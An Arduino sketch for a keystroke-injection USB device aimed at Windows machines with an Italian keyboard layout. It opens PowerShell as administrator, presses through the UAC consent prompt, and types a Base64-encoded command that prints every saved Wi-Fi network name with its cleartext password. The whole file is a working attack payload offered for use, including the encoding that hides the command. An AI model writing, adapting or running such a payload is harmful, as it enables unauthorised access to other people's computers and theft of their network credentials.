#include <KeyboardMultiLanguage.h>
#include <KeyboardMappingIT.h>

void setup()
{
  // Initialize the keyboard
  Keyboard.language(Italian);
  delay(1000);
  
  // Press the Windows key
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.release(KEY_LEFT_GUI);
  delay(100);
  
  // Type "powershell" in the search bar
  Keyboard.print("powershell");
  delay(1000);
 
  // Press CTRL + SHIFT + ENTER to open PowerShell with administrator privileges
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_LEFT_CTRL);
  Keyboard.release(KEY_LEFT_SHIFT);
  Keyboard.release(KEY_RETURN);
  delay(1000);
  
  // Simulate the action of clicking "Yes" on the UAC prompt to allow the script to continue running with administrator privileges.
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.release(KEY_LEFT_ARROW);
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(1000);

  // The following Base64 encoded command retrieves the SSIDs and passwords of known Wi-Fi networks on the system:
  String payload = "powershell -command \"Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KG5ldHNoIHdsYW4gc2hvdyBwcm9maWxlcyl8U2VsZWN0LVN0cmluZyAnXDooLispJCd8JXskbmFtZT0kXy5NYXRjaGVzLkdyb3Vwc1sxXS5WYWx1ZS5UcmltKCk7JF99fCV7KG5ldHNoIHdsYW4gc2hvdyBwcm9maWxlIG5hbWU9IiRuYW1lIiBrZXk9Y2xlYXIpfXxTZWxlY3QtU3RyaW5nICdDb250ZW51dG8gY2hpYXZlXFcrXDooLispJCd8JXskcGFzcz0kXy5NYXRjaGVzLkdyb3Vwc1sxXS5WYWx1ZS5UcmltKCk7JF99fCV7W1BTQ3VzdG9tT2JqZWN0XUB7UFJPRklMRV9OQU1FPSRuYW1lO1BBU1NXT1JEPSRwYXNzfX18Rm9ybWF0LVRhYmxlIC1BdXRvU2l6ZQ==')))\"";
  Keyboard.print(payload);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
}

void loop()
{
  
}